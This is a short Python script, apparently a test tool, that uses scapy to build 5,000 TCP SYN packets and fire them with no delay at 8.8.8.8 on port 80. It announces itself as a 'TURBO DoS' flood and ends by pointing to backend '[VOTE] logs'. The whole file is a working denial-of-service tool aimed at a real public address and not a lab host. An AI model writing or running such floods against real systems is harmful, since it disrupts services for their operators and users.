# trigger_dos_turbo.py
from scapy.all import send, IP, TCP, Raw
import random

TARGET_IP = "8.8.8.8" 
TARGET_PORT = 80 
PACKET_COUNT = 5000  
SRC_PORT = random.randint(1024, 65535)

print(f"[*] Launching TURBO DoS (Port {SRC_PORT} -> {TARGET_IP})...")

# Pre-build packets for speed
packets = []
for i in range(PACKET_COUNT):
    p = IP(dst=TARGET_IP)/TCP(sport=SRC_PORT, dport=TARGET_PORT, flags="S")/Raw(load="X"*50)
    packets.append(p)

print(f"[*] Flooding {PACKET_COUNT} packets...")
# inter=0 means "don't wait", flood the network
send(packets, verbose=1, inter=0) 

print("[+] Done. Check Backend Console for [VOTE] logs.")